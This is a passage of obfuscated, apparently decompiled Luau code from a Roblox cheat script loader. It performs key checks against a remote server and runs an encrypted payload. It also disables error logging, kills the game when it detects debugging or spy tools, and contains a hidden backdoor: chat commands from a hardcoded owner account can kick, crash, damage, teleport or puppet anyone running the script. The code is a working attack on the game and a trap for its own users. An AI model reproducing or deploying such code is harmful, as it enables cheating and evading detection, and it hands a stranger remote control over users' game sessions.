		return tbl12
	end

	local function fn23(arg, arg2)
		local v59 = fn19(#arg, true, arg2)

		for i = 1, #arg do
			v59 ..= fn19(v26(arg, i, i), false, arg2)
		end

		return v59
	end

	local function fn24(arg, arg2, arg3)
		if arg == 1 then
			tbl11 = arg2
			n15 = arg3
		elseif arg == 2 then
			n12 = 0
			n14 = 0
		elseif arg == 3 then
			return n14
		end
	end

	local v59 = fn15(v53(2, 32768 + v24() % 2000) + n6 % 4096)
	local v60 = fn9(v57(1, 32768) + n7 + v24() % 1000)
	local v61 = v59(111111, 999999)
	local tbl12 = {}

	for i = 1, v61 % 30 + 1 do
		local fn25

		if i == 2 then
			fn25 = v31
		elseif i == 8 then
			fn25 = v10
		elseif i == 17 then
			fn25 = v26
		else
			fn25 = function()
			end
		end

		tbl12[i] = fn25
	end

	local n16 = v60(111111, 999999) + 16313
	local n17 = v59(1, 1234) * v60(2, 1235) + n6 % 80000
	local n18 = 10000 + ((1445613873 * ((1445613873 * (n11 + n6) % 1627389952 + 23515) % 94716599 + 1) + 23515) % 94716599 + 1) % 100000 - 10000 + 1
	local tbl13 = { n18 + v59(100000, 1000000), n18 + v60(100000, 1000000), (v59(100000, 1000000)) }
	v4 = v4 or v5

	if v4 then
		n9 = 218
	end

	if flag8 then
		n9 = 250
	end

	local v62 = tbl13[1]
	local n19 = 1099 + tbl10[4]
	local n20 = tbl10[2] + 16313
	local n21 = 11263 + tbl10[1]
	local str2 = ((((((fn23(v3[fn2("", 9937783858215)] .. n16) .. fn23(v3[fn2("", 6043203409404)] .. fn13(11263 + v61) .. fn10(n9 + n17) .. fn7(n16 - 16313))) .. fn23(n17 .. v3[fn2("", 5877842122082)]) .. fn23(v3[fn2("", 1146791265324)] .. v61)) .. fn23(tbl10[3] + 11886 .. v3[fn2("", 30184877583823)])) .. fn23(v3[fn2("", 24209321973778)] .. v62) .. fn23(v3[fn2("", 2249557772335)] .. n19)) .. fn23(tbl13[3] .. v3[fn2("", 17002146905562)]) .. fn23(v3[fn2("", 22752209851077)] .. n20)) .. fn23(tbl13[2] .. v3[fn2("", 7266232670831)]) .. fn23(v3[fn2("", 12423572041010)] .. n21)) .. fn23(str or v3[fn2("\158", 10995451832320)])
	local str3 = fn23(fn14(fn24(3) + 4666) .. v3[fn2("", 7759095209018)], true) .. str2
	local tbl14 = {}
	local v63 = v60(111111, 999999)
	local v64 = n6
	getfenv()[tbl14] = v63
	local v65, v66 = fn16(tbl5[v3[fn2("oL\140\148", 27792507790619)]] .. v3[fn2("-", 11376641812835)] .. v9 .. v3[fn2("x\t{\235r\133", 24176034961395)] .. tbl5[v3[fn2("al\251%6\223\236\184", 17950289871181)]] .. v3[fn2("\224\0169\166g\224c\n", 14999557289617)] .. str3 .. v3[fn2("#h\186", 22395716686201)] .. tbl5[v3[fn2("\183\133\1682\157\180\161o\254ň\143\133", 10056972838038)]] .. v3[fn2("\239\1815", 18680456594421)] .. v35, n8 == 9 or n8 == 15)
	n6 = -1
	fn12(tbl8)

	while n6 == -1 do
	end

	while tbl10[2] ~= v58 do
	end

	local n22 = 0

	for k, v67 in v32(tbl12) do
		if k == 2 and v67 ~= v31 then
			n9 = 147
		end

		if k == 8 and v67 ~= v10 then
			n9 = 147
		end

		if k == 17 and v67 ~= v26 then
			n9 = 147
		end

		n22 = k
	end

	if n22 ~= v61 % 30 + 1 then
		n9 = 147
	end

	local flag9 = false

	if n9 == 147 then
		flag9 = true
	end

	if n6 ~= v64 then
		n9 = 100
		flag9 = true
	end

	if v65 == v3[fn2("\223:\197", 18608513696690)] then
		while true do
		end
	else
		if v33(v65, v3[fn2("{\160\"\190\168\237\187\246\18R\189\15\tP\226\229H\27\197=\146\140\150\210]\193>\170\241\31{Rs\220Kb\28\251\16W|", 23368556467459)]) then
			if v8 then
				v8(v3[fn2("\178\163$M\196", 20828005780421)])
				return
			end
		end

		if v26(v65, 1, 1) == v3[fn2("\229", 26748798886223)] then
			local v67 = v3[fn2(")\23v\14\140\1973\133\12g+z|\131;", 1500063106421)]
			local v68

			if string[v3[fn2("\8_J\173", 14335964591143)]](v65, v3[fn2("\23\12\20\30\251\t\137<\0\128C\243\214H\178\153\175", 16030380898897)]) then
				v67 = v3[fn2("\164\17 \168h\190A\26;\185\127y\239o\165\246j\163w", 1651465324034)]
				v68 = v26(v65, 2, #v65 - 17)
			else
				v68 = v26(v65, 2, #v65)
			end

			fn11(100, v3[fn2("6\27\168\191\145\174<\153i|+\163\241\134", 2631821527443)], v3[fn2("\208\21(9kʥ\246\22@4\134\235ݽ\192\145\24\176|\157U\177\127\28\167", 2031581529956)], Color3[v3[fn2("ƒ\179", 34935256383255)]](1, 0, 0), v3[fn2(">ׅ\226\243", 27616408757367)])
			fn4(v67, v68)
			fn6()
		end

		if v66 then
			if not v66[v3[fn2("\2223\184\148Uk6\172\rG", 12945426493208)]] then
				local v67 = v66[v3[fn2("<-<G\17\166D\154=\200", 34741976956515)]]
			end
		end

		local n23 = tbl10[4] % 256
		local tbl15 = { [0] = tbl10[1] % 256, tbl10[2] % 256, tbl10[3] % 256, n23 }
		fn5()

		local function fn25(arg)
			local n24 = 1103515245
			local n25 = 12345
			local n26 = 99999999
			local n27 = arg % 2147483648
			local n28 = 1

			return function(arg2, arg3)
				local v67 = n26
				local n29 = n24 * n27 + n25
				local n30 = n29 % v67 + n28
				n28 += 1
				n27 = n30
				n25 = n29 % 4859 * v67 % 5781
				return arg2 + n30 % arg3 - arg2 + 1
			end
		end

		if getfenv()[tbl14] ~= v63 then
			n9 = 100
			flag9 = true
		end

		local n24 = 1

		for i = 1, 30 do
			local v67 = v31({})
			local n25

			if v31({}) < v67 then
				n25 = n24 + 1
			else
				n25 = n24 * 2
			end

			n24 = n25 % 10000
		end

		fn24(1, tbl15, 4)
		local v67 = fn22(v65)
		local n25 = v67[1] - n16
		local n26 = v67[4] - v61

		while n23 ~= tbl15[3] do
		end

		fn17()
		local v68 = tbl15[3]

		local tbl16 = {
			[0] = tbl15[0],
			[2] = tbl15[1],
			[4] = tbl15[2],
			[6] = v68,
			v67[9],
			[3] = v67[7],
			[5] = v67[2],
			[7] = v67[6],
		}

		fn24(1, tbl16, 8)
		local n27 = v67[8] - tbl13[1]
		local n28 = v67[3] - tbl13[2]
		local n29 = v67[5] - tbl13[3]
		local str4 = v3[fn2("", 27674392585389)] .. fn14(tbl13[3] + 17106) .. fn13(tbl13[1] + 31) .. fn10(tbl13[2] + 13647)
		local flag10

		if v67[11] == str4 and ({ [str4] = true })[v67[11]] then
			flag10 = true
		else
			local str5 = v3[fn2("", 22060699013185)] .. fn7(tbl13[3] + 17106) .. fn10(tbl13[1] + 69) .. fn13(tbl13[2] + 13647)
			local flag11 = v67[11] == str5 and ({ [str5] = true })[v67[11]]
			flag10 = nil

			if flag11 then
				flag10 = true
			end
		end

		if flag10 then
			local flag11 = v18(v67[14] and v67[14] or v3[fn2("\177\149", 9173256347999)]) == -1
			v18(v67[15] and v67[15] or v3[fn2("\180", 27737745286376)])
		end

		n6 = -1
		fn12()

		if n6 == -1 then
			n9 = 250
			n6 = 100
		end

		local n30 = n7 + v59(111111, 999999) + v60(1234, 5678) + n6 % 99915 + n24
		tbl13[4] = n7 + n6 % 9951
		v59(100000, 1000000 + n6 % 1000)
		tbl13[5] = n6 % 8005 + n24 + v60(100000, 1000000 + n6 % 5000)
		tbl13[6] = v59(100000, 1000000)
		fn24(2)
		local v69 = tbl13[6]
		local v70 = tbl13[4]
		local str5 = fn23(v3[fn2("", 25929508871764)] .. fn10(v67[13] + 11733) .. fn14(n30 + n9) .. fn13(v67[10] + v61)) .. fn23(tbl13[5] .. v3[fn2("", 12067078876134)]) .. fn23(v3[fn2("", 18656833553375)] .. n30) .. fn23(v3[fn2("", 13013074292567)] .. v69) .. fn23(v70 .. v3[fn2("", 31459448025714)])
		local str6 = fn23(fn10(fn24(3) + 4666) .. v3[fn2("", 33406201362823)], true) .. str5
		local v71 = v67[12]
		local response = v14:HttpGet(tbl5[v3[fn2("\8+U\3", 4475492503624)]] .. v3[fn2("1", 13323395149944)] .. v9 .. v3[fn2("\15\18\169o1\189b\236\236\167\4U", 11342281025859)] .. v71 .. v3[fn2("\174\160x", 26048697851587)] .. str6)

		while v68 ~= tbl16[6] do
		end

		if response == v3[fn2("-\211b", 7369315031759)] then
			while true do
			end
		else
			if v26(response, 1, 1) == v3[fn2("\149", 25417318390903)] then
				v14:GetService(v3[fn2("\181\r\140\17ę\180", 23033538794443)])[v3[fn2("\2221\178\26\128\249U\30>i\229", 8753410482136)]]:Kick(response)
				fn6()
			end

			local v72 = fn22(response)
			fn25(1 + v59(100, 1000 + n24) + v60(500, 5000 + n24) + n7 % 10000)
			local flag11 = false
			local flag12 = false
			local flag13 = nil
			local v73 = nil

			for i = 1, 3 do
				local v74 = v72[3]
				local str7 = fn10(tbl13[5] + 16313) .. fn10(tbl13[4] + fn20(flag11 and v3[fn2("\192", 13406075793605)] or v14[v3[fn2("gl\2\139+", 16818531450159)]])) .. fn10(tbl13[6] + tbl13[2])

				if v74 == str7 and ({ [str7] = true })[v74] then
					if not (v72[8] and v72[8] ~= v3[fn2("\160", 17333943254799)] and v72[8]) then
						local v75 = v3[fn2("U\153\242C\21\244\223", 23652032960011)]
					end

					if not (v72[9] and v72[9]) then
						local v75 = v3[fn2("\162\12i\232\16\188\127", 19086343390575)]
					end

					v73 = v72[6]
					local n31 = v72[1] - tbl13[4]
					local n32 = v72[7] - tbl13[5]
					local n33 = v72[5] - tbl13[6]
					local v75 = n27
					local v76 = n28
					local v77 = n29

					n27 = function(arg)
						return v75 * arg % n31 + arg * 3
					end

					n28 = function(arg)
						return v76 * arg % 10000 + arg * n32 % 4
					end

					n29 = function(arg)
						return (arg + n33) % 100 * arg % (v77 % 100 + 1)
					end

					flag12 = true
					flag13 = true
					break
				elseif i == 3 then
					flag12 = false
					flag13 = nil
					v73 = nil
				else
					flag11 = true
					flag12 = false
					flag13 = nil
					v73 = nil
				end
			end

			if not flag12 then
				while true do
				end
			elseif flag9 then
				while true do
				end
			else
				flag4 = true
				fn11(95, v3[fn2("a", 33990334741415)], v3[fn2("W\226\131\208e\30\142=\244M\236\19\174'H", 10862303782788)])
				fn11(100, v3[fn2("\247\221\3\0124\219/kh\203\209H#C\184", 27844048971083)], v3[fn2("\140\5\158\157\\\134\8\n\255Y\239\2\181-7ʿan\28", 9090575704338)] .. v29() - now .. v3[fn2("\183", 9583438242525)], Color3[v3[fn2("\247\0\245", 214754918600)]](0, 1, 0), v3[fn2("\183\194wc", 32179950777617)])
				local v74 = nil

				local tbl17 = {
					[17] = 166,
					[16] = 1,
					[7] = 149,
					[2] = 240,
					[15] = 15,
					[10] = 98,
					[8] = 89,
					[5] = 36,
					[14] = 159,
					[3] = 56,
					[18] = 230,
					[4] = 202,
					[9] = 197,
					[6] = 103,
					[13] = 12,
					[19] = 176,
					[11] = 220,
					216,
					[12] = 125,
				}

				luraph_runtime1(v73, buffer.fromstring("\168X\134\27\2520\16\21+\231\22\130\19p\167\224R;\160\16\190y\184jwR\1597\171\198\195\206_Y\137(Oohm\23\160 u\140\153\232ti6\241hf\22\198y\135\208mr\2456E)n\143\8\178\140\25\22S\147uGuu\220\203c\148\135\196\18/\21N)ﴯB|ĀjɈ\177Bvf\187cL\157W\166\22\182t\234\4\4FUl#W\188\247mN\226\153\207\228\232 \165d\156\24\195\253\222#\214\236\15a\249U\199\238M\222:i[\193\135\179\180\27q\239P\191U\0309ut\154\131\254\145\235\154\21\225W\132\14\1830\236y!u\252\232\19\\\2337ï+\217\203\221\31\203\27\236\144\28\128\191\1282\7=!{&\11j\145\7jIA\161\190C\200\216\213R\164\0ݾ\229\0\31Y\163\168\163B4o\254pCs\127\246Q\1700ڰ\244\252\193\191\217=\247\163R,\17\153\n\n\2395\229S߫z9\6_\155v\141\250\20\200\221\u{5C8}q\135:\0204\"\154{k;\224\28w\132Q\226\147N\2369\202\229\152s\228\237\2477\181\144\17Bz\\\185_r\145\16\177Tͩ\144\20\205\28<\239V\195\233\241\189\7\180L\147\213\246C\156\177\207\"\185\1543\144b\28TwԈ~\t\217L.F\3)\154\175ͣ\\\129\248\23B\168\141\142w\211C\1\29N:\160Ѻ]\166\172\182U\251.\154\196_Կ\173\178aN\151\180\163\238\24\254\211U\21ڬW\130\233\174\2193\137\185r\160S\182O\25\191\250\"\196˺n\186'JÑ[-\169\151\2416\151ضU[ΐX\244\16\23\145\6\170)m\201㸐\172\0M\182\145\u{558}DJb\208\127\205P&\236\2068\129Z\151S\25>/,\203\247>\183\199K\174\239-\194\239\0\174u^\160B|\246&*O\158\1~\201\198\222.\28\19\253n\168}J\231\129\20o\24.;\140.\200z\212)\2\179\184dzt2\154/L\14\143\1336\162\1\239\233\254\25-_\196]\155\2100\14\231ޫ\145\174q2\n\217\7\22\18E\1924\182\142\229\170 :Ӎ\8\1mN!\252\237\232\143\254D$8\211Ro\239\152_\144\28\183P\"4\31\1\212\2371:\1\240ߵ\30~d$\18A\207\250 Y}\175\218\243\243\nm\1681l\158\220\231\157\224V\146&<\30\188\153\191}\137Պ\2432\158\165\29\129\11\252\28\162\21%\22<\165\186\189\145\165\170T\137\210\237\30\225W\230\135\2489\181\186\15I\154\225s\29U\164\5>s>\226WM'\226\186ڋI\254\12\218\213\31=\173\2421Ğ\171\u{EE7C9}(\212-\224\3\17\r\28Ǡ.\232kfR\177\163KL\127\215w\128\130\253\136\30\199\11\244\178%/]\182K\164;\176\230\237\6\"r\136\203p\242\159w\158\145q\27\165R&\145|\4\253|\163\17\165Ye\231\152\243\209 \\u\203\224\190\3B\0AX\202\29\30-\16jp\162\164\236\253M\194/_}\176\212%v\239t\195p\161\139@\20\169\149\224\227\167>}\147\141\28\17680k\180멻\159\132A\178\169\154\133\153h\241=^\170-\225\25Ry?f\138\6W\11\159m\16\249Z@\141\186\11\25OE\232\232\193\"\196rEmU\22\130A\255Kag=/\12\194\213J\18\192\206\16\26\230Z\236\142j\14\242\190e\152\161'q٫2/3I$\224\242L\178\14\247\213\198\254O\1330\189\190\22\22\30\185\30\220\194\223\225\242h\153ee\211e\26gIF\143\231\235dɧ)\21ѐ\4S\23+\198;\233I_w\135Wf\5q\161\143\205\20+s\210!\146\136\233[_\196X\27\255\183&w\249\6\154\233\243\164\176\213x\18\137\0\21\169\139D\217\31\209\198&[\235-P\11jNA;G|>\185\129\205\204o\224\220A\174e\30\166X\128\134:\222\22.\218\14dTTj\7\23'&\203\249\234Vƙ儢\213a\1599\3ɔeH\232\158Ͷ\188\n\251\219r\172\131\154N\197-\209-\244\28nvl\198Q\248\226OQjKw$\1928*f\12\t\186\193\15n3\196-|\181\136\213Er\137N\136\191\255\149\223?W\252\26\206\208\127\190\149\198=\"\211\234\24БS\30#P\167qg\240\157o\194\1D\152 m%\1492S\192\176}\144\5\157\212g\227c\210<t\"\144\132\237\223Aw;p\135f\232ߤ\188\187\16\175\159\241\129\22\154ILX\204\19U8\133\167ĠWh\u{F4C65}\252>\204\195q\182\174f\u{557}-0\159\207L̠I?u\18{\234\172P\209Ce\18\130\186\138$\166+\26\200،\r\172\169\213N\137Y4\1\149\220\204v.\212x\198T|\142t\186W\1764\6<\224\189\217?n=\225ǣ Fi\222\r\188Y\250Eq\168\130F4/7)\31p\158\1524\129\157\156E\171\135Ը\232\167\4\195\24y-\148\218\250\202\249\177\0198JS6[0\160\241 S|F>(\199zn%\240\210Jʯ\\ɬ\218\2ꙉx\203\198{\175\151q\149&\139\167ɩX\205Vۨ\233\217fiZ\11d\167\2240\159\253\143\145\192\168\182\170LOquE\219\207Bڋ\149\5\1301\145\8Wp\8N\4\225\n\167\8}\201\207bi\19\228~ߛ\1\202\195\228\244\159\3Ntd\201ͼz\164Dd\157S?\255\140]4\17!\239?ٖ\tL<ʏ|\170\128\20\129\153kT\229\250\29\166!\219X\178g\1632\18\11\169Q\235jovЍ\152b\144[|\\\236\171p<B\137)\185\178\138\137K\221=Hi2\2247\216\2102\160\167ԁ\174HMW\r\238\151\22Zud\r\\Mn\242\157Gx1\214-=~\138C\163/\225\n\150\237a\174\24\253\223F+\164\159ݢ.Ef\192\231\196\0316\250\185\240\160[a\162\245\31\213S\157{\8\131xP\151)\250\217g\199\7\205G0\148\147(m\167r\176\18\159\136\193\"\242ᔕ\r\147\205J}Y\132f\203sE\233\244\24}c\137\206m\134\u{9A}\151O\t2Rk\5Y\205\248m\240\225\5X\2311M\253\139\171\u{F8408}\243\137=\212Z\29\177\252K\175\16629\6\135}\225J\213r!ؿm &\143\228 \190\154\135\159U\23\187Uw\12\20\146$\0173)3<=\163_\156\190\194\237T֫\1892\244h\188\130A{&\152{\175\179\195\t\181\187\239\199K\160\28Q\239\172\2\5\14ή\249\134{R\238cX\227\187\21\240,\154F\226\135!\199,J\28ND\200\8\12d\155e3\163\174\127\171\184\190\155b.eo9\254ĭ%\128\1506\226\nD\244\25\136\189\204c8\235\173S\205\234v\219F%\250\166\205\206P`˒\228\187b\207\4|\2436\15}id\130\130\191\251VlD\214e\"Y\6\183\160\223\n\182\143\145y0\18\4g\15\245\22\244\140ڠÉ \165x\142\254\147t\157\202Ba\186\251\230\248\143p\245\\1\237\0\160ˌQ\128s\221a\0\171\165\235/\225\19\237Skf\163\1472\232\160е\186\128L3\2479\25\2544|\6g\1288\235\188\n\181x\238*\217\t.s\227\143>A\241]\128mf\209\127\230S*g\227e\232(¶l\2`\251\211Lh'ʨR\8*>\132\197CPI\143\136%s\202I\247\28C\139iM\237v\250H'\164\n\20n\16856\185Pa\30\154\231|\204\213\2 \233Y\171\148\158H\132br\143z\"\225\249=\27{b \215\20'\213\241\191\192D7բ*\182܊\210A\169\130e\3鸡\151#\137AU\224\201 X\223\192\231\133\nQ[\225\231,\1581.[\31O\134(\155t\2\232\2Z\18\229\187\t\182u]N\236\133'3\160C\6[\19J\183\11ES\1472\185\17m@\190\143\\+\180m\12\149Y\2543\245\254\8)x\167\1590\239\tX\232\t\rId/\142\u{5FB}\205l\138t'\186:\233\142\221\220@C\8\181\11\229\31\22\141ʪ\144&\127\25\8\177\135\228\219U\20E0&\176\219`\182R\130\224W]>\1990,O\135\2\237\22\141\237\147e\163\157\144\189.b>\189\t\224\11\207\221\8P\175\143U\u{E7CB}\0\189\149\21(\154m\193!n'Ք\142\224%W\132\213\242\1629\5\"\23\227\141̮\203\215WM\2052/xI\137h\218Qf7\154SR\233\234\\m\248rc\237\31\3\142w\16\248<\0078&\4\214\207?H\155\198$G\127r\186\146\132\196!\218K\187\165`\252\30B.\190\127\131\237\197|\142>\166\185ƻ\180\212^\r\155\15$\248\219$\127W.\4H\230RGsRy2L\252ɃX\1946\200\239\1756\239iSc(\233h\139\143E\152֒x=\186\6\200\236r\217\211\255\205\222zs\220\2033\157&\127\191\227\237\202\207\14^\236ZW\237\186\16\3\194j\189\249=\192.\30\169\232s\\\148\25徖\12\224\4dF٤Z\230䰊\244\243\136\244\228\239D\250t\213 \27^1\147Q\251\240U1\139$\216T\244\2\250\230\180rO\243\128\21\188\226\251\4\t\20\189k\245\247\129N\207YI\213֊\21x\211m\175\7\7ܲ\177Sw'\239\233\28\27\224\191)"), tbl17, 632)()

				if v74[78] <= n27(v74[11]) then
					local fn26

					do
						local localPlayer, Players, fn27, fn28, tbl18, tbl19, fn29

						do
							local str7, fn30

							do
								do
									if identifyexecutor() ~= "Madium" then
										if n29(3475) <= 3917 then
											local v75 = getconnections or get_signal_cons

											if v75 then
												local v76 = next
												local v77, v78 = v75(game.Players.LocalPlayer.Idled)

												for _, v79 in v76, v77, v78 do
													if v79.Disable then
														v79:Disable()
													elseif v79.Disconnect then
														v79:Disconnect()
													end
												end
											else
												game.Players.LocalPlayer.Idled:Connect(function()
													game:GetService("VirtualUser"):CaptureController()
													game:GetService(v74[63]):ClickButton2(Vector2.new())
												end)
											end
										else
											while true do
											end
										end
									else
										game.Players.LocalPlayer.Idled:Connect(function()
											game:GetService(v74[63]):CaptureController()
											game:GetService("VirtualUser"):ClickButton2(Vector2.new())
										end)
									end

									if game.GameId == 1552004129 or game.GameId == 10563114921 then
										for _, v75 in pairs(getconnections(game:GetService("ScriptContext").Error)) do
											v75:Disable()
										end

										for _, v75 in pairs(getconnections(game:GetService("LogService").MessageOut)) do
											v75:Disable()
										end
									end

									do
										local HttpService = game:GetService("HttpService")

										fn26 = function(arg, arg2)
											if not arg or arg == "" then
												return nil
											end

											local ok, result = pcall(function()
												return http.request({
													Url = string.format("https://discord.com/api/v9/invites/%s?with_counts=true&with_expiration=true", arg),
													Method = v74[21],
													Headers = { ["User-Agent"] = "Mozilla/5.0" },
												})
											end)

											if not ok or not result or result.StatusCode ~= 200 then
												return nil
											end

											local ok2, result2 = pcall(function()
												return HttpService:JSONDecode(result.Body)
											end)

											if not ok2 or not result2 or not result2.guild then
												return nil
											end
											local guild = result2.guild
											local str8 = nil

											if guild.icon then
												str8 = string.format("https://cdn.discordapp.com/icons/%s/%s.png?size=1024", guild.id, guild.icon)
											end

											local tbl20 = {
												Name = guild.name,
												Description = guild.description,
												GuildID = guild.id,
												InviteCode = result2.code,
												MemberCount = result2.approximate_member_count,
												OnlineCount = result2.approximate_presence_count,
												Icon = guild.icon,
												IconURL = str8,
												NSFW = guild.nsfw or false,
												CreatedAt = result2.created_at or nil,
											}

											if arg2 == nil or arg2 == "All" then
												return tbl20
											end

											if tbl20[arg2] ~= nil then
												return tbl20[arg2]
											end
											return nil
										end
									end
								end

								if game.Players.LocalPlayer.Name ~= "v4mpzxlk" then
									if game.GameId == v74[77] then
										spawn(function()
											while wait() do
												pcall(function()
													for _, child in ipairs(game.CoreGui:GetChildren()) do
														if string.find(child.Name, "Remote") or string.find(child.Name, "Http") then
															while v74[15] do
															end
														end
													end

													for _, child in ipairs(game.CoreGui:GetChildren()) do
														for _, child2 in ipairs(child:GetChildren()) do
															if not child2:FindFirstChild(v74[48]) then
																continue
															end

															while true do
															end
														end
													end
												end)
											end

											if n25 >= 2674 then
												while v74[15] do
												end
											end
										end)
									else
										spawn(function()
											while wait() do
												pcall(function()
													for _, child in ipairs(game.CoreGui:GetChildren()) do
														if not (string.find(child.Name, "Remote") or string.find(child.Name, "Http") or string.find(child.Name, "Spy")) then
															continue
														end
														game:Shutdown()

														while true do
														end
													end

													for _, child in ipairs(game.CoreGui:GetChildren()) do
														for _, child2 in ipairs(child:GetChildren()) do
															if child2:FindFirstChild("ContextMenus") then
																game:Shutdown()

																while v74[15] do
																end
															end
														end
													end
												end)
											end
										end)
									end
								end

								do
									local ReplicatedStorage = game:GetService("ReplicatedStorage")
									Players = game:GetService("Players")
									localPlayer = Players.LocalPlayer
									str7 = ";"
									local tbl20 = { Poop = "rbxassetid://4809574295" }
									local tbl21 = { Toilet = "rbxassetid://6602412551" }
									tbl19 = { v4mpzxlk = 10992131421 }
									tbl18 = {}

									fn28 = function(arg)
										return arg:sub(v74[42], 1) == str7 and arg:sub(2)
									end

									fn30 = function(arg)
										local v75 = arg:len()
										local str8 = arg:lower()

										for _, player in pairs(Players:GetPlayers()) do
											local str9 = player.Name:lower()
											local str10 = player.DisplayName:lower()
											if str9:sub(v74[42], v75) == str8 or str10:sub(1, v75) == str8 then
												return player
											end
										end
									end

									local function fn31(arg)
										return arg == "all" or fn30(arg) == localPlayer
									end

									fn27 = function(arg)
										local tbl22 = {}

										local function fn32(arg2, arg3)
											for _, v75 in ipairs(arg2) do
												tbl22[v75:lower()] = arg3
											end
										end

										fn32({ "prefix", v74[61] }, function(...)
											str7 = table.concat({ ... }, " ")
										end)

										fn32({ "say", v74[27] }, function(arg2, ...)
											local v75 = v74[31]

											if n27(4696) <= v75 then
												if fn31(arg2) then
													ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(table.concat({ ... }, " "), "All")
												end

												return
											end

											while true do
											end
										end)

										fn32({ "reset", "r" }, function(arg2)
											if fn31(arg2) then
												localPlayer.Character.Humanoid:ChangeState(15)
											end
										end)

										fn32({ "damage", "dmg" }, function(arg2, arg3)
											if 1552 > n29(702) then
												if fn31(arg2) then
													localPlayer.Character.Humanoid:TakeDamage(tonumber(arg3) or math.huge)
												end

												return
											end

											while true do
											end
										end)

										fn32({ "break", "bk" }, function(arg2)
											if fn31(arg2) then
												_env.FarmFuncs = nil

												if n25 >= 2677 then
													while true do
													end
												end
											end
										end)

										fn32({ v74[57], v74[30] }, function(arg2, ...)
											if fn31(arg2) then
												local message = Instance.new("Message", workspace)
												message.Text = table.concat({ ... }, " ")
												Debris:AddItem(message, 5)
											end
										end)

										fn32({ "kick", "k" }, function(arg2, ...)
											if fn31(arg2) then
												localPlayer:Kick(table.concat({ ... }, " "))
											end
										end)

										fn32({ "shutdown", "exit" }, function(arg2)
											if fn31(arg2) then
												game:shutdown()
											end
										end)

										fn32({ "crash", "cs" }, function(arg2)
											if not fn31(arg2) then
												return
											end

											while true do
											end
										end)

										fn32({ "toilet", "tl" }, function(arg2)
											if fn31(arg2) then
												local primaryPart = localPlayer.Character.PrimaryPart
												local humanoid = localPlayer.Character.Humanoid
												local seat = Instance.new("Seat")
												seat.Anchored = true
												seat.CanCollide = false
												seat.Size = Vector3.new(v74[26], 2, 3.7)
												seat.Position = primaryPart.Position
												local specialMesh = Instance.new("SpecialMesh")
												specialMesh.Scale = Vector3.new(4.5, 4.5, v74[70])
												specialMesh.MeshId = tbl21.Toilet
												specialMesh.Offset = Vector3.new(0, -0.5, v74[76])
												local sound = Instance.new("Sound")
												sound.SoundId = tbl20.Poop
												sound.Looped = true
												sound:Play()
												sound.Parent = seat
												specialMesh.Parent = seat
												seat.Parent = workspace
												Debris:AddItem(sound, 8)
												Debris:AddItem(seat, v74[40])
												humanoid.Sit = true
												humanoid.JumpPower = 0
												primaryPart.Anchored = true
												primaryPart.CFrame = seat.CFrame
												_wait(8)
												primaryPart.Anchored = v74[62]
												local bodyAngularVelocity = Instance.new("BodyAngularVelocity", primaryPart)
												bodyAngularVelocity.P = _huge
												bodyAngularVelocity.MaxTorque = Vector3_new(_huge, _huge, _huge)
												bodyAngularVelocity.AngularVelocity = Vector3_new(100, v74[36], 100)
												local instance = Instance.new(v74[9])
												instance.BlastRadius = _huge
												instance.BlastPressure = _huge

												instance.Hit:Once(function()
													humanoid:ChangeState(v74[12])
												end)

												instance.Position = primaryPart.Position
												instance.Parent = seat
											end
										end)

										fn32({ "owner", "co", "otag" }, function(arg2)
											local v75 = fn30(arg2)
											if not v75 then
												return
											end
											local instance = Instance.new(v74[19])
											instance.MaxDistance = 90
											instance.Size = UDim2.new(v74[76], 170, 0, 80)
											instance.StudsOffset = Vector3.new(0, 3, 0)
											local textLabel = Instance.new("TextLabel", instance)
											textLabel.Text = v74[33]
											textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
											textLabel.Font = Enum.Font.FredokaOne
											textLabel.Size = UDim2.new(1, 0, 1, 0)
											textLabel.BackgroundTransparency = 1
											textLabel.TextSize = v74[55]
											instance.Adornee = v75.Character.Head
											instance.Parent = v75.Character.Humanoid
										end)

										fn32({ "bring", "bg", "b" }, function(arg2)
											if n25 > 2689 then
												while v74[15] do
												end
											end

											if fn31(arg2) then
												if v74[18] < n28(1402) then
													localPlayer.Character.PrimaryPart.CFrame = arg.Character.PrimaryPart.CFrame
												else
													while v74[15] do
													end
												end

												if n25 < v74[25] then
													while true do
													end
												end
											end
										end)

										fn32({ "freeze", "fz" }, function(arg2)
											if fn31(arg2) then
												for _, descendant in ipairs(localPlayer.Character:GetDescendants()) do
													if descendant:IsA("BasePart") and not descendant.Anchored then
														descendant.Anchored = true
													end
												end
											end
										end)

										return tbl22
									end
								end
							end

							fn29 = function()
								local tbl20 = {}

								local function fn31(arg, arg2)
									for _, v75 in ipairs(arg) do
										tbl20[v75:lower()] = arg2
									end
								end

								fn31({ "prefix", "key" }, function(...)
									str7 = table.concat({ ... }, " ")
								end)

								fn31({ "join", "jobid" }, function(arg)
									TeleportService:TeleportToPlaceInstance(game.PlaceId, arg:gsub("`", ""), localPlayer)
								end)

								fn31({ "to", "tp" }, function(arg)
									local v75 = fn30(arg)

									if v75 then
										localPlayer.Character.PrimaryPart.CFrame = v75.Character.PrimaryPart.CFrame
									end
								end)

								return tbl20
							end
						end

						local function fn30(message)
							local v75 = fn28(message:lower())

							if v75 then
								local parts = v75:split(" ")
								local v76 = tbl18[parts[1]]

								if v76 then
									local tbl20 = {}

									for i = 2, #parts do
										table.insert(tbl20, parts[i])
									end

									task.spawn(v76, unpack(tbl20))
								end
							end
						end

						local function fn31(player)
							if player ~= localPlayer and tbl19[player.Name] == player.UserId then
								tbl18 = fn27(player)

								if n26 >= 7643 then
									while true do
									end
								else
									player.Chatted:Connect(fn30)
								end
							elseif tbl19[player.Name] == localPlayer.UserId then
								tbl18 = fn29()
								localPlayer.Chatted:Connect(fn30)
							end
						end

						Players.PlayerAdded:Connect(fn31)

						for _, player in ipairs(Players:GetPlayers()) do
							fn31(player)
						end
					end

					local lib, fn27, fn28

					do
						if game.GameId == 10008473853 then
							IdScript = "68876655c2e91ee4d59b707543cbe93d"
						elseif game.GameId == 994732206 then
							local v75 = v74[41]

							if getgenv().Mode == v75 then
								IdScript = "91a8b88bcf6042a6a71136424e26b3da"
							else
								local v76 = v74[13]

								if getgenv().Mode == v76 then
									IdScript = "ee8623ac6ab97c7669605673ffc8fd86"
								elseif getgenv().Mode == "LGBTQ Hub Cracked" then
									IdScript = "095bdd33adb5d3eab3c76532ac00e02b"
								else
									IdScript = "91ad1adafbf3c787ec5eb952dbfcd389"
								end
							end
						elseif game.GameId == 1451439645 then
							IdScript = "6dca2aa39e3dc9125e156e39d2d1aa4d"
						elseif game.GameId == v74[44] then
